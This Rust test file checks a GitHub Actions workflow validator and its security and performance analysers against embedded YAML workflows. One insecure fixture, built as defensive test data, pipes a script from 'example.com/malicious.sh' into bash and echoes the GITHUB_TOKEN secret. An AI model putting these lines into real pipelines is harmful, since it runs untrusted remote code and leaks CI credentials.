//! Integration tests for GitHub Actions validation tools

use std::fs;
use std::path::PathBuf;
use tempfile::TempDir;
use crate::workflow_validator::WorkflowValidator;
use crate::workflow_executor::WorkflowExecutor;
use crate::security_tester::SecurityTester;
use crate::performance_tester::PerformanceTester;
use crate::models::{WorkflowValidationResult, SecurityResult, PerformanceResult};

/// Test CI workflow validation
#[tokio::test]
async fn test_ci_workflow_validation() {
    // 创建临时目录
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建一个有效的CI工作流
    let ci_workflow = r#"name: CI

on:
  push:
    branches: [master, develop]
  pull_request:
    branches: [master]

jobs:
  test:
    name: Test
    runs-on: ubuntu-latest
    timeout-minutes: 30
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Install Rust
      uses: dtolnay/rust-toolchain@stable
      with:
        components: clippy, rustfmt
    
    - name: Cache cargo registry
      uses: actions/cache@v4
      with:
        path: |
          ~/.cargo/registry
          ~/.cargo/git
          target
        key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
        restore-keys: |
          ${{ runner.os }}-cargo-
          ${{ runner.os }}-
    
    - name: Check formatting
      run: cargo fmt --all -- --check
    
    - name: Run clippy
      run: cargo clippy --all-targets --all-features -- -D warnings
    
    - name: Run tests
      run: cargo test --all --verbose
    
    - name: Build
      run: cargo build --all --release --verbose
"#;
    
    let workflow_path = repo_path.join(".github/workflows/ci.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, ci_workflow).unwrap();
    
    // 测试工作流验证
    let validator = WorkflowValidator::new(workflow_path.to_str().unwrap()).unwrap();
    let validation_result = validator.validate();
    
    assert!(validation_result.is_valid, "CI workflow should be valid");
    
    // 测试触发条件
    let executor = WorkflowExecutor::new(repo_path.to_str().unwrap(), None);
    let trigger_results = executor.test_trigger_conditions(workflow_path.to_str().unwrap()).unwrap();
    
    assert!(trigger_results.len() >= 2, "Should have push and pull_request triggers");
    
    // 验证分支配置
    let push_trigger = trigger_results.iter().find(|t| t.trigger_type == "push").unwrap();
    assert!(push_trigger.is_configured);
    assert_eq!(push_trigger.branches, vec!["master", "develop"]);
    
    let pr_trigger = trigger_results.iter().find(|t| t.trigger_type == "pull_request").unwrap();
    assert!(pr_trigger.is_configured);
    assert_eq!(pr_trigger.branches, vec!["master"]);
}

/// Test release workflow validation
#[tokio::test]
async fn test_release_workflow_validation() {
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建一个有效的发布工作流
    let release_workflow = r#"name: Release

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:

jobs:
  build:
    name: Build Release
    runs-on: ubuntu-latest
    timeout-minutes: 45
    strategy:
      matrix:
        target: [x86_64-unknown-linux-gnu, x86_64-apple-darwin, x86_64-pc-windows-msvc]
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Install Rust
      uses: dtolnay/rust-toolchain@stable
    
    - name: Cache cargo registry
      uses: actions/cache@v4
      with:
        path: |
          ~/.cargo/registry
          ~/.cargo/git
          target
        key: ${{ runner.os }}-cargo-release-${{ hashFiles('**/Cargo.lock') }}
        restore-keys: |
          ${{ runner.os }}-cargo-release-
          ${{ runner.os }}-cargo-
          ${{ runner.os }}-
    
    - name: Build release
      run: cargo build --release --target ${{ matrix.target }}
    
    - name: Run tests
      run: cargo test --release --target ${{ matrix.target }}
    
    - name: Upload artifacts
      uses: actions/upload-artifact@v3
      with:
        name: binary-${{ matrix.target }}
        path: target/${{ matrix.target }}/release/*
        retention-days: 30

  publish:
    name: Publish Release
    runs-on: ubuntu-latest
    needs: build
    if: startsWith(github.ref, 'refs/tags/v')
    timeout-minutes: 30
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Download all artifacts
      uses: actions/download-artifact@v3
    
    - name: Create Release
      uses: softprops/action-gh-release@v1
      with:
        files: |
          binary-*/
        draft: false
        prerelease: false
        generate_release_notes: true
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
"#;
    
    let workflow_path = repo_path.join(".github/workflows/release.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, release_workflow).unwrap();
    
    // 测试工作流验证
    let validator = WorkflowValidator::new(workflow_path.to_str().unwrap()).unwrap();
    let validation_result = validator.validate();
    
    assert!(validation_result.is_valid, "Release workflow should be valid");
    
    // 测试矩阵配置
    let executor = WorkflowExecutor::new(repo_path.to_str().unwrap(), None);
    let matrix_result = executor.test_matrix_configuration(workflow_path.to_str().unwrap()).unwrap();
    
    assert!(matrix_result.has_matrix, "Release workflow should have matrix configuration");
    assert!(matrix_result.is_valid, "Matrix configuration should be valid");
    assert_eq!(matrix_result.matrix_vars.len(), 1, "Should have target matrix variable");
    assert!(matrix_result.matrix_vars.contains_key("target"), "Should have target variable");
    
    // 测试依赖关系
    let dependency_result = executor.test_job_dependencies(workflow_path.to_str().unwrap()).unwrap();
    assert!(dependency_result.has_dependencies, "Release workflow should have job dependencies");
    assert!(dependency_result.is_valid, "Dependencies should be valid");
}

/// Test security workflow validation
#[tokio::test]
async fn test_security_workflow_validation() {
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建一个有效的安全工作流
    let security_workflow = r#"name: Security Scan

on:
  push:
    branches: [master, develop]
  pull_request:
    branches: [master]
  schedule:
    - cron: '0 2 * * 1'  # Every Monday at 2 AM

jobs:
  security-audit:
    name: Security Audit
    runs-on: ubuntu-latest
    timeout-minutes: 15
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Install Rust
      uses: dtolnay/rust-toolchain@stable
    
    - name: Cache cargo registry
      uses: actions/cache@v4
      with:
        path: |
          ~/.cargo/registry
          ~/.cargo/git
        key: ${{ runner.os }}-cargo-audit-${{ hashFiles('**/Cargo.lock') }}
        restore-keys: |
          ${{ runner.os }}-cargo-audit-
          ${{ runner.os }}-
    
    - name: Install cargo-audit
      run: cargo install cargo-audit --locked
    
    - name: Run security audit
      run: cargo audit --deny warnings
    
    - name: Check for Yanked Dependencies
      run: cargo audit --deny yanked

  secret-scan:
    name: Secret Scan
    runs-on: ubuntu-latest
    timeout-minutes: 10
    
    steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 0
    
    - name: Run secret scan
      uses: trufflesecurity/trufflehog@v3
      with:
        path: .
        base: main
        head: HEAD
        extra_args: --only-verified

  codeql-analysis:
    name: CodeQL Analysis
    runs-on: ubuntu-latest
    timeout-minutes: 30
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Initialize CodeQL
      uses: github/codeql-action/init@v3
      with:
        languages: rust
    
    - name: Autobuild
      uses: github/codeql-action/autobuild@v3
    
    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v3
"#;
    
    let workflow_path = repo_path.join(".github/workflows/security-scan.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, security_workflow).unwrap();
    
    // 测试工作流验证
    let validator = WorkflowValidator::new(workflow_path.to_str().unwrap()).unwrap();
    let validation_result = validator.validate();
    
    assert!(validation_result.is_valid, "Security workflow should be valid");
    
    // 测试触发条件
    let executor = WorkflowExecutor::new(repo_path.to_str().unwrap(), None);
    let trigger_results = executor.test_trigger_conditions(workflow_path.to_str().unwrap()).unwrap();
    
    assert!(trigger_results.len() >= 3, "Should have push, pull_request, and schedule triggers");
    
    // 验证定时任务触发
    let schedule_trigger = trigger_results.iter().find(|t| t.trigger_type == "schedule");
    assert!(schedule_trigger.is_some(), "Should have schedule trigger");
    
    // 测试安全性
    let security_tester = SecurityTester::new(workflow_path.to_str().unwrap()).unwrap();
    let security_result = security_tester.run_security_tests();
    
    assert!(security_result.is_secure, "Security workflow should be secure");
    
    // 验证使用了缓存
    assert!(security_result.cache_configured, "Security workflow should use caching");
    
    // 验证超时配置
    assert!(security_result.timeout_configured, "Security workflow should have timeouts");
}

/// Test performance workflow validation
#[tokio::test]
async fn test_performance_workflow_validation() {
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建一个有效的性能工作流
    let performance_workflow = r#"name: Performance Test

on:
  push:
    branches: [master]
  pull_request:
    branches: [master]
  schedule:
    - cron: '0 3 * * 0'  # Every Sunday at 3 AM

jobs:
  benchmark:
    name: Benchmark
    runs-on: ubuntu-latest
    timeout-minutes: 60
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Install Rust
      uses: dtolnay/rust-toolchain@stable
    
    - name: Cache cargo registry
      uses: actions/cache@v4
      with:
        path: |
          ~/.cargo/registry
          ~/.cargo/git
          target
        key: ${{ runner.os }}-cargo-bench-${{ hashFiles('**/Cargo.lock') }}
        restore-keys: |
          ${{ runner.os }}-cargo-bench-
          ${{ runner.os }}-cargo-
          ${{ runner.os }}-
    
    - name: Run benchmarks
      run: cargo bench --verbose
    
    - name: Upload benchmark results
      uses: actions/upload-artifact@v3
      with:
        name: benchmark-results
        path: target/criterion/
        retention-days: 30

  performance-analysis:
    name: Performance Analysis
    runs-on: ubuntu-latest
    needs: benchmark
    timeout-minutes: 30
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Download benchmark results
      uses: actions/download-artifact@v3
      with:
        name: benchmark-results
    
    - name: Analyze performance
      run: |
        echo "Analyzing performance metrics..."
        echo "Performance analysis completed"
    
    - name: Generate performance report
      run: |
        echo "# Performance Report" > performance-report.md
        echo "## Test Results" >> performance-report.md
        echo "Performance tests completed successfully" >> performance-report.md
    
    - name: Upload performance report
      uses: actions/upload-artifact@v3
      with:
        name: performance-report
        path: performance-report.md
"#;
    
    let workflow_path = repo_path.join(".github/workflows/performance.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, performance_workflow).unwrap();
    
    // 测试工作流验证
    let validator = WorkflowValidator::new(workflow_path.to_str().unwrap()).unwrap();
    let validation_result = validator.validate();
    
    assert!(validation_result.is_valid, "Performance workflow should be valid");
    
    // 测试性能指标
    let performance_tester = PerformanceTester::new(workflow_path.to_str().unwrap()).unwrap();
    let performance_result = performance_tester.analyze_performance();
    
    assert!(performance_result.is_valid, "Performance workflow should be valid");
    assert!(performance_result.cache_configured, "Performance workflow should use caching");
    assert!(performance_result.timeout_configured, "Performance workflow should have timeouts");
    
    // 验证性能指标
    assert!(performance_result.execution_time_estimate > 0, "Should have execution time estimate");
    assert!(performance_result.resource_usage_estimate > 0, "Should have resource usage estimate");
}

/// Test workflow security scanning
#[tokio::test]
async fn test_workflow_security_scanning() {
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建一个有安全问题的测试工作流
    let insecure_workflow = r#"name: Insecure Workflow

on:
  push:
    branches: [master]

jobs:
  test:
    name: Insecure Test
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v2
    
    - name: Run test
      run: |
        echo "Hello World"
        echo "Secret: ${{ secrets.GITHUB_TOKEN }}"
    
    - name: Download dangerous artifact
      uses: actions/download-artifact@v2
      with:
        name: untrusted-artifact
        path: ./
    
    - name: Run unsafe command
      run: |
        curl http://example.com/malicious.sh | bash
"#;
    
    let workflow_path = repo_path.join(".github/workflows/insecure.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, insecure_workflow).unwrap();
    
    // 测试安全扫描
    let security_tester = SecurityTester::new(workflow_path.to_str().unwrap()).unwrap();
    let security_result = security_tester.run_security_tests();
    
    // 这个工作流应该被识别为不安全
    assert!(!security_result.is_secure, "Insecure workflow should be detected");
    
    // 验证检测到的漏洞
    assert!(security_result.vulnerabilities.len() > 0, "Should detect vulnerabilities");
    
    // 检查特定漏洞类型
    let has_secret_leak = security_result.vulnerabilities.iter()
        .any(|v| v.category == "Secret Leak");
    assert!(has_secret_leak, "Should detect secret leak");
    
    let has_unsafe_command = security_result.vulnerabilities.iter()
        .any(|v| v.category == "Unsafe Command");
    assert!(has_unsafe_command, "Should detect unsafe command");
    
    let has_outdated_action = security_result.vulnerabilities.iter()
        .any(|v| v.category == "Outdated Action");
    assert!(has_outdated_action, "Should detect outdated action");
}

/// Test workflow performance analysis
#[tokio::test]
async fn test_workflow_performance_analysis() {
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建一个性能不佳的测试工作流
    let slow_workflow = r#"name: Slow Workflow

on:
  push:
    branches: [master]

jobs:
  slow-job:
    name: Slow Job
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Install dependencies (no cache)
      run: |
        sudo apt-get update
        sudo apt-get install -y lots-of-packages
    
    - name: Build without optimization
      run: |
        cargo build --verbose
    
    - name: Run tests sequentially
      run: |
        cargo test --lib
        cargo test --bin main
        cargo test --integration
    
    - name: Upload large artifacts
      uses: actions/upload-artifact@v3
      with:
        name: large-artifact
        path: target/
        retention-days: 90
"#;
    
    let workflow_path = repo_path.join(".github/workflows/slow.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, slow_workflow).unwrap();
    
    // 测试性能分析
    let performance_tester = PerformanceTester::new(workflow_path.to_str().unwrap()).unwrap();
    let performance_result = performance_tester.analyze_performance();
    
    // 验证性能问题被检测到
    assert!(!performance_result.cache_optimized, "Should detect missing cache optimization");
    assert!(!performance_result.parallel_execution, "Should detect lack of parallel execution");
    
    // 验证性能指标
    assert!(performance_result.execution_time_estimate > 300, "Should estimate long execution time");
    assert!(performance_result.resource_usage_estimate > 70, "Should estimate high resource usage");
    
    // 验证优化建议
    assert!(performance_result.optimization_suggestions.len() > 0, "Should provide optimization suggestions");
    
    // 检查特定建议
    let has_cache_suggestion = performance_result.optimization_suggestions.iter()
        .any(|s| s.contains("cache"));
    assert!(has_cache_suggestion, "Should suggest caching optimization");
}

/// Test workflow validation with real project structure
#[tokio::test]
async fn test_real_project_validation() {
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建模拟的Rust项目结构
    let cargo_toml = r#"[workspace]
members = ["server1", "server2"]

[workspace.dependencies]
tokio = "1.0"
serde = "1.0"
"#;
    
    fs::write(repo_path.join("Cargo.toml"), cargo_toml).unwrap();
    
    // 创建服务器目录
    fs::create_dir_all(repo_path.join("server1/src")).unwrap();
    fs::create_dir_all(repo_path.join("server2/src")).unwrap();
    
    // 创建基本源文件
    fs::write(repo_path.join("server1/src/main.rs"), "fn main() { println!(\"Hello\"); }").unwrap();
    fs::write(repo_path.join("server2/src/main.rs"), "fn main() { println!(\"World\"); }").unwrap();
    
    // 创建服务器Cargo.toml
    fs::write(repo_path.join("server1/Cargo.toml"), r#"[package]
name = "server1"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { workspace = true }
serde = { workspace = true }
"#).unwrap();
    
    fs::write(repo_path.join("server2/Cargo.toml"), r#"[package]
name = "server2"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { workspace = true }
serde = { workspace = true }
"#).unwrap();
    
    // 创建CI工作流
    let ci_workflow = r#"name: Project CI

on:
  push:
    branches: [master]
  pull_request:
    branches: [master]

jobs:
  test:
    name: Test
    runs-on: ubuntu-latest
    strategy:
      matrix:
        server: [server1, server2]
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Install Rust
      uses: dtolnay/rust-toolchain@stable
    
    - name: Cache cargo registry
      uses: actions/cache@v4
      with:
        path: |
          ~/.cargo/registry
          ~/.cargo/git
          target
        key: ${{ runner.os }}-cargo-${{ matrix.server }}-${{ hashFiles(format('{{}}/Cargo.lock', matrix.server)) }}
        restore-keys: |
          ${{ runner.os }}-cargo-${{ matrix.server }}-
          ${{ runner.os }}-cargo-
          ${{ runner.os }}-
    
    - name: Test server
      working-directory: ${{ matrix.server }}
      run: |
        cargo test --verbose
        cargo build --release
"#;
    
    let workflow_path = repo_path.join(".github/workflows/ci.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, ci_workflow).unwrap();
    
    // 测试验证
    let validator = WorkflowValidator::new(workflow_path.to_str().unwrap()).unwrap();
    let validation_result = validator.validate();
    
    assert!(validation_result.is_valid, "Project CI workflow should be valid");
    
    // 测试执行器
    let executor = WorkflowExecutor::new(repo_path.to_str().unwrap(), None);
    let trigger_results = executor.test_trigger_conditions(workflow_path.to_str().unwrap()).unwrap();
    
    assert!(trigger_results.len() >= 2, "Should have push and pull_request triggers");
    
    // 测试矩阵配置
    let matrix_result = executor.test_matrix_configuration(workflow_path.to_str().unwrap()).unwrap();
    assert!(matrix_result.has_matrix, "Should have matrix configuration");
    assert_eq!(matrix_result.matrix_vars.get("server").unwrap().len(), 2, "Should have 2 servers");
}

/// Test comprehensive validation
#[tokio::test]
async fn test_comprehensive_validation() {
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建一个完整的项目结构
    let project_files = vec![
        (".github/workflows/ci.yml", include_str!("../../fixtures/valid_ci.yml")),
        (".github/workflows/release.yml", include_str!("../../fixtures/valid_release.yml")),
        (".github/workflows/security.yml", include_str!("../../fixtures/valid_security.yml")),
        ("Cargo.toml", include_str!("../../fixtures/workspace_cargo.toml")),
        ("src/main.rs", "fn main() { println!(\"Hello\"); }"),
    ];
    
    for (file_path, content) in project_files {
        let full_path = repo_path.join(file_path);
        fs::create_dir_all(full_path.parent().unwrap()).unwrap();
        fs::write(full_path, content).unwrap();
    }
    
    // 综合验证
    let workflows = vec![
        ".github/workflows/ci.yml",
        ".github/workflows/release.yml", 
        ".github/workflows/security.yml"
    ];
    
    let mut all_valid = true;
    let mut all_secure = true;
    let mut all_performant = true;
    
    for workflow in workflows {
        let workflow_path = repo_path.join(workflow);
        
        // 验证工作流
        let validator = WorkflowValidator::new(workflow_path.to_str().unwrap()).unwrap();
        let validation_result = validator.validate();
        all_valid &= validation_result.is_valid;
        
        // 安全测试
        let security_tester = SecurityTester::new(workflow_path.to_str().unwrap()).unwrap();
        let security_result = security_tester.run_security_tests();
        all_secure &= security_result.is_secure;
        
        // 性能测试
        let performance_tester = PerformanceTester::new(workflow_path.to_str().unwrap()).unwrap();
        let performance_result = performance_tester.analyze_performance();
        all_performant &= performance_result.is_valid;
    }
    
    assert!(all_valid, "All workflows should be valid");
    assert!(all_secure, "All workflows should be secure");
    assert!(all_performant, "All workflows should be performant");
}

/// Test error handling
#[tokio::test]
async fn test_error_handling() {
    // 测试无效的工作流文件
    let result = WorkflowValidator::new("nonexistent.yml");
    assert!(result.is_err(), "Should return error for nonexistent file");
    
    // 测试无效的YAML内容
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    let invalid_yaml = "invalid: yaml: content: [unclosed";
    let workflow_path = repo_path.join(".github/workflows/invalid.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, invalid_yaml).unwrap();
    
    let validator = WorkflowValidator::new(workflow_path.to_str().unwrap()).unwrap();
    let validation_result = validator.validate();
    
    assert!(!validation_result.is_valid, "Invalid YAML should not be valid");
    assert!(validation_result.errors.len() > 0, "Should have validation errors");
}

/// Test performance improvements
#[tokio::test]
async fn test_performance_improvements() {
    let temp_dir = TempDir::new().unwrap();
    let repo_path = temp_dir.path();
    
    // 创建原始工作流
    let original_workflow = r#"name: Original Workflow

on:
  push:
    branches: [master]

jobs:
  test:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Build without cache
      run: cargo build --verbose
    
    - name: Test sequentially
      run: cargo test --verbose
"#;
    
    let workflow_path = repo_path.join(".github/workflows/original.yml");
    fs::create_dir_all(workflow_path.parent().unwrap()).unwrap();
    fs::write(&workflow_path, original_workflow).unwrap();
    
    // 分析原始性能
    let performance_tester = PerformanceTester::new(workflow_path.to_str().unwrap()).unwrap();
    let original_result = performance_tester.analyze_performance();
    
    // 创建优化后的工作流
    let optimized_workflow = r#"name: Optimized Workflow

on:
  push:
    branches: [master]

jobs:
  test:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Cache cargo registry
      uses: actions/cache@v4
      with:
        path: |
          ~/.cargo/registry
          ~/.cargo/git
          target
        key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
    
    - name: Build with cache
      run: cargo build --verbose
    
    - name: Test in parallel
      run: cargo test --verbose --jobs 4
"#;
    
    let optimized_path = repo_path.join(".github/workflows/optimized.yml");
    fs::write(&optimized_path, optimized_workflow).unwrap();
    
    // 分析优化后性能
    let optimized_tester = PerformanceTester::new(optimized_path.to_str().unwrap()).unwrap();
    let optimized_result = optimized_tester.analyze_performance();
    
    // 验证性能改进
    assert!(optimized_result.cache_optimized, "Optimized workflow should use cache");
    assert!(optimized_result.execution_time_estimate < original_result.execution_time_estimate, 
            "Optimized workflow should be faster");
}